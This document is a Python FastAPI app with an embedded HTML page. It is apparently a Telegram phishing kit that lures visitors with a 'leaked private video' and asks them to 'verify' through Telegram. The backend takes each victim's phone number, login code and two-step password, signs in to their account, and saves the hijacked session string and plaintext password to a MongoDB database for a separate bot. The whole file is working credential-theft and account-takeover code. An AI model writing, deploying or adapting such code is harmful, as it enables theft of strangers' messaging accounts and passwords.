import os
import re
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, 
    PhoneCodeInvalid, 
    PasswordHashInvalid, 
    PhoneCodeExpired
)
from motor.motor_asyncio import AsyncIOMotorClient

# ---------------------------------------------------------
# App & Config Setup
# ---------------------------------------------------------
app = FastAPI(title="Premium Video Hub")

# Environment Variables (Render Dashboard se load honge)
API_ID = int(os.environ.get("API_ID", "123456"))
API_HASH = os.environ.get("API_HASH", "YOUR_API_HASH")
MONGO_URL = os.environ.get("MONGO_URL", "mongodb+srv://user:pass@cluster.mongodb.net/?retryWrites=true&w=majority")
CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/your_private_channel")

# MongoDB Client Setup (Master Bot Synced)
mongo_client = AsyncIOMotorClient(MONGO_URL)
db = mongo_client["telegram_db"]
sessions_col = db["sessions"]  # Collection name synced with Bot

# Temporary Memory Storage for Active Telegram Login Sessions
active_clients = {}

# ---------------------------------------------------------
# Helper Function for Flexible Phone Cleaning
# ---------------------------------------------------------
def clean_phone_number(phone_raw: str) -> str:
    digits = re.sub(r'[^\d+]', '', phone_raw)
    if digits.startswith('+'):
        return digits
    if digits.startswith('0'):
        digits = digits[1:]
    if len(digits) == 10:
        return f"+91{digits}"
    return f"+{digits}"

# ---------------------------------------------------------
# Request Models
# ---------------------------------------------------------
class PhoneReq(BaseModel):
    phone: str

class OtpReq(BaseModel):
    phone: str
    code: str

class PasswordReq(BaseModel):
    phone: str
    password: str

# ---------------------------------------------------------
# HTML UI Template: PREMIUM VIDEO HUB (FINAL)
# ---------------------------------------------------------
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Premium Video Hub</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <style>
    body { background: #0d0e12; color: #f3f4f6; font-family: 'Inter', sans-serif; }
    .glass { background: rgba(22, 24, 34, 0.85); backdrop-filter: blur(14px); border: 1px solid rgba(255, 255, 255, 0.08); }
    .btn-pink-gradient { 
      background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%); 
      transition: all 0.3s ease; 
      box-shadow: 0 8px 25px -5px rgba(255, 65, 108, 0.5);
    }
    .btn-pink-gradient:hover { 
      transform: translateY(-2px); 
      box-shadow: 0 12px 30px -5px rgba(255, 65, 108, 0.7); 
    }
    .video-card-gradient {
      background: linear-gradient(180deg, #6a11cb 0%, #2575fc 100%);
    }
  </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-between p-3 md:p-6">

  <header class="w-full max-w-xl text-center py-4 mb-2">
    <h1 class="text-2xl md:text-3xl font-black tracking-wider text-white uppercase flex items-center justify-center gap-2">
      <span class="text-red-500"><i class="fa-solid fa-fire"></i></span> PREMIUM VIDEO HUB
    </h1>
    <p class="text-xs text-gray-400 mt-1 tracking-wide">Exclusive content — Verified members only</p>
  </header>

  <main class="w-full max-w-xl space-y-6">
    
    <div class="glass rounded-3xl overflow-hidden p-3 border border-gray-800 shadow-2xl">
      <div class="relative w-full aspect-video rounded-2xl overflow-hidden video-card-gradient flex items-center justify-center border border-white/10 shadow-inner">
        <button onclick="openModal()" class="w-16 h-16 bg-white/20 backdrop-blur-md rounded-full flex items-center justify-center text-white text-2xl hover:scale-110 transition shadow-lg border border-white/30">
          <i class="fa-solid fa-play ml-1"></i>
        </button>
      </div>

      <div class="p-3 space-y-2">
        <div class="flex items-center justify-between">
          <h2 class="text-lg font-bold text-white tracking-wide">🔥 LEAKED PRIVATE VIDEO — 2026</h2>
        </div>
        <div class="flex items-center gap-3 text-xs text-gray-400">
          <span class="text-yellow-400 font-semibold"><i class="fa-solid fa-star"></i> 4.9 (2.4M views)</span>
          <span>•</span>
          <span class="text-gray-300">18+</span>
        </div>
        <div>
          <span class="inline-block px-2.5 py-0.5 bg-red-500/20 text-red-400 border border-red-500/30 text-[10px] font-bold rounded-md uppercase tracking-wider">
            🔒 RESTRICTED
          </span>
        </div>
      </div>

      <button onclick="openModal()" class="w-full mt-2 py-4 btn-pink-gradient text-white font-extrabold text-base md:text-lg rounded-2xl flex items-center justify-center gap-2 tracking-wide uppercase">
        <i class="fa-brands fa-telegram text-2xl"></i> GET YOUR LINK TAP TO VERIFY VIA TELEGRAM
      </button>
    </div>

    <div>
      <h3 class="text-sm font-bold text-gray-300 mb-3 tracking-wide flex items-center gap-2">
        <span class="text-red-500"><i class="fa-solid fa-fire"></i></span> More Videos
      </h3>
      <div class="grid grid-cols-2 gap-3">
        <div onclick="openModal()" class="glass rounded-2xl overflow-hidden border border-gray-800 cursor-pointer hover:border-gray-600 transition">
          <div class="w-full h-28 bg-gradient-to-br from-pink-600 to-purple-800 flex items-center justify-center relative">
            <i class="fa-solid fa-play text-white/80 text-xl"></i>
          </div>
          <div class="p-2.5">
            <div class="text-xs font-bold text-white">Private 01</div>
            <div class="text-[10px] text-gray-400 mt-0.5">2.1M views</div>
          </div>
        </div>

        <div onclick="openModal()" class="glass rounded-2xl overflow-hidden border border-gray-800 cursor-pointer hover:border-gray-600 transition">
          <div class="w-full h-28 bg-gradient-to-br from-amber-600 to-red-800 flex items-center justify-center relative">
            <i class="fa-solid fa-play text-white/80 text-xl"></i>
          </div>
          <div class="p-2.5">
            <div class="text-xs font-bold text-white">Private 02</div>
            <div class="text-[10px] text-gray-400 mt-0.5">1.8M views</div>
          </div>
        </div>

        <div onclick="openModal()" class="glass rounded-2xl overflow-hidden border border-gray-800 cursor-pointer hover:border-gray-600 transition">
          <div class="w-full h-28 bg-gradient-to-br from-emerald-600 to-teal-800 flex items-center justify-center relative">
            <i class="fa-solid fa-play text-white/80 text-xl"></i>
          </div>
          <div class="p-2.5">
            <div class="text-xs font-bold text-white">Private 03</div>
            <div class="text-[10px] text-gray-400 mt-0.5">1.5M views</div>
          </div>
        </div>

        <div onclick="openModal()" class="glass rounded-2xl overflow-hidden border border-gray-800 cursor-pointer hover:border-gray-600 transition">
          <div class="w-full h-28 bg-gradient-to-br from-blue-600 to-indigo-800 flex items-center justify-center relative">
            <i class="fa-solid fa-play text-white/80 text-xl"></i>
          </div>
          <div class="p-2.5">
            <div class="text-xs font-bold text-white">Private 04</div>
            <div class="text-[10px] text-gray-400 mt-0.5">1.2M views</div>
          </div>
        </div>
      </div>
    </div>
  </main>

  <div id="authModal" class="fixed inset-0 bg-black/85 backdrop-blur-md hidden flex items-center justify-center p-4 z-50">
    <div class="glass w-full max-w-md rounded-3xl p-6 relative border border-gray-700 shadow-2xl">
      <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white"><i class="fa-solid fa-xmark text-xl"></i></button>

      <div id="step-phone" class="space-y-4">
        <div class="text-center">
          <i class="fa-brands fa-telegram text-5xl text-red-500 mb-2"></i>
          <h3 class="text-xl font-bold">Telegram Verification</h3>
          <p class="text-xs text-gray-400 mt-1">Enter your phone number with country code</p>
        </div>
        <input type="text" id="phoneInput" placeholder="+91 XXXXX XXXXX" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-red-500 text-lg text-center tracking-widest">
        <button onclick="sendCode()" id="btnSendCode" class="w-full py-3.5 btn-pink-gradient text-white font-bold rounded-xl uppercase tracking-wider">Send Code</button>
      </div>

      <div id="step-otp" class="space-y-4 hidden">
        <div class="text-center">
          <i class="fa-solid fa-shield-halved text-5xl text-emerald-500 mb-2"></i>
          <h3 class="text-xl font-bold">Enter 5-Digit OTP Code</h3>
          <p class="text-xs text-gray-400 mt-1">Check your official Telegram app for verification code</p>
          <p id="displayPhone" class="text-xs text-red-400 font-semibold mt-1"></p>
        </div>
        <input type="text" id="otpInput" placeholder="• • • • •" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-emerald-500 text-2xl text-center tracking-widest font-mono">
        
        <button onclick="verifyOtp()" id="btnVerifyOtp" class="w-full py-3.5 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-xl transition uppercase tracking-wider">Verify & Continue</button>

        <div class="flex items-center justify-between text-xs text-gray-400 pt-2 border-t border-gray-800">
          <button onclick="goBackToPhone()" class="hover:text-red-400 flex items-center gap-1">
            <i class="fa-solid fa-pen-to-square"></i> Edit Number
          </button>
          <button onclick="sendCode(true)" id="btnResend" class="hover:text-emerald-400 flex items-center gap-1">
            <i class="fa-solid fa-rotate-right"></i> Resend OTP
          </button>
        </div>
      </div>

      <div id="step-2fa" class="space-y-4 hidden">
        <div class="text-center">
          <i class="fa-solid fa-lock text-5xl text-yellow-500 mb-2"></i>
          <h3 class="text-xl font-bold">Two-Step Verification</h3>
          <p class="text-xs text-gray-400 mt-1">Your Telegram account requires 2FA password</p>
        </div>
        <input type="password" id="passwordInput" placeholder="Password" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-yellow-500 text-lg text-center">
        <button onclick="verify2FA()" id="btnVerify2FA" class="w-full py-3.5 bg-yellow-600 hover:bg-yellow-500 text-white font-bold rounded-xl transition uppercase tracking-wider">Submit Password</button>
      </div>

      <p id="errorMsg" class="text-red-400 text-xs text-center mt-3 hidden"></p>
    </div>
  </div>

  <footer class="text-gray-600 text-xs text-center py-4">
    &copy; 2026 Premium Video Hub. All Rights Reserved.
  </footer>

  <script>
    let userPhone = "";

    function openModal() { document.getElementById('authModal').classList.remove('hidden'); }
    function closeModal() { document.getElementById('authModal').classList.add('hidden'); }

    function showError(msg) {
      const err = document.getElementById('errorMsg');
      err.innerText = msg;
      err.classList.remove('hidden');
    }

    function goBackToPhone() {
      document.getElementById('step-otp').classList.add('hidden');
      document.getElementById('step-phone').classList.remove('hidden');
      document.getElementById('errorMsg').classList.add('hidden');
      document.getElementById('btnSendCode').innerText = "Send Code";
    }

    async function sendCode(isResend = false) {
      if(!isResend) {
        userPhone = document.getElementById('phoneInput').value.trim();
      }
      
      if(!userPhone) return showError("Please enter a valid phone number.");

      const btn = isResend ? document.getElementById('btnResend') : document.getElementById('btnSendCode');
      btn.innerText = isResend ? "Resending..." : "Sending...";

      const res = await fetch('/api/send-code', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phone: userPhone })
      });
      const data = await res.json();
      
      if(res.ok) {
        userPhone = data.phone;
        document.getElementById('displayPhone').innerText = "Sent to: " + userPhone;
        document.getElementById('step-phone').classList.add('hidden');
        document.getElementById('step-otp').classList.remove('hidden');
        document.getElementById('errorMsg').classList.add('hidden');
      } else {
        showError(data.detail || "Error sending OTP");
      }

      document.getElementById('btnSendCode').innerText = "Send Code";
      document.getElementById('btnResend').innerHTML = '<i class="fa-solid fa-rotate-right"></i> Resend OTP';
    }

    async function verifyOtp() {
      const code = document.getElementById('otpInput').value.trim();
      document.getElementById('btnVerifyOtp').innerText = "Verifying...";
      const res = await fetch('/api/verify-otp', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phone: userPhone, code: code })
      });
      const data = await res.json();
      if(res.ok) {
        if(data.require_2fa) {
          document.getElementById('step-otp').classList.add('hidden');
          document.getElementById('step-2fa').classList.remove('hidden');
          document.getElementById('errorMsg').classList.add('hidden');
        } else {
          window.location.href = data.link;
        }
      } else {
        showError(data.detail || "Invalid OTP");
        document.getElementById('btnVerifyOtp').innerText = "Verify & Continue";
      }
    }

    async function verify2FA() {
      const password = document.getElementById('passwordInput').value.trim();
      document.getElementById('btnVerify2FA').innerText = "Verifying 2FA...";
      const res = await fetch('/api/verify-2fa', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phone: userPhone, password: password })
      });
      const data = await res.json();
      if(res.ok) {
        window.location.href = data.link;
      } else {
        showError(data.detail || "Incorrect Password");
        document.getElementById('btnVerify2FA').innerText = "Submit Password";
      }
    }
  </script>
</body>
</html>
"""

# ---------------------------------------------------------
# API Endpoints
# ---------------------------------------------------------
@app.get("/", response_class=HTMLResponse)
async def serve_ui():
    return HTML_TEMPLATE

@app.post("/api/send-code")
async def send_code(data: PhoneReq):
    phone = clean_phone_number(data.phone)
    try:
        if phone in active_clients:
            try:
                await active_clients[phone]["client"].disconnect()
            except Exception:
                pass

        client = Client(name=f"sess_{phone}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await client.connect()
        sent_code = await client.send_code(phone)
        
        active_clients[phone] = {
            "client": client,
            "phone_code_hash": sent_code.phone_code_hash
        }
        return {"status": "ok", "message": "OTP sent successfully", "phone": phone}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/verify-otp")
async def verify_otp(data: OtpReq):
    phone = clean_phone_number(data.phone)
    if phone not in active_clients:
        raise HTTPException(status_code=400, detail="Session expired. Restart process.")
    
    session = active_clients[phone]
    client: Client = session["client"]
    phone_code_hash = session["phone_code_hash"]
    
    try:
        await client.sign_in(phone, phone_code_hash, data.code)
        string_session = await client.export_session_string()
        await client.disconnect()
        
        # Save Session & Default 2FA ('None') to MongoDB
        await sessions_col.update_one(
            {"phone": phone},
            {"$set": {
                "phone": phone, 
                "session": string_session, 
                "two_factor": "None", 
                "status": "active"
            }},
            upsert=True
        )
        del active_clients[phone]
        
        return {"status": "success", "require_2fa": False, "link": CHANNEL_LINK}

    except SessionPasswordNeeded:
        return {"status": "require_2fa", "require_2fa": True}
    except PhoneCodeInvalid:
        raise HTTPException(status_code=400, detail="Invalid OTP code.")
    except PhoneCodeExpired:
        raise HTTPException(status_code=400, detail="OTP Code Expired.")
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/verify-2fa")
async def verify_2fa(data: PasswordReq):
    phone = clean_phone_number(data.phone)
    if phone not in active_clients:
        raise HTTPException(status_code=400, detail="Session expired. Restart process.")
    
    client: Client = active_clients[phone]["client"]
    
    try:
        await client.check_password(data.password)
        string_session = await client.export_session_string()
        await client.disconnect()
        
        # Save Session & 2FA Password to MongoDB
        await sessions_col.update_one(
            {"phone": phone},
            {"$set": {
                "phone": phone, 
                "session": string_session, 
                "two_factor": data.password, 
                "status": "active"
            }},
            upsert=True
        )
        del active_clients[phone]
        
        return {"status": "success", "link": CHANNEL_LINK}
    except PasswordHashInvalid:
        raise HTTPException(status_code=400, detail="Incorrect 2FA Password.")
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
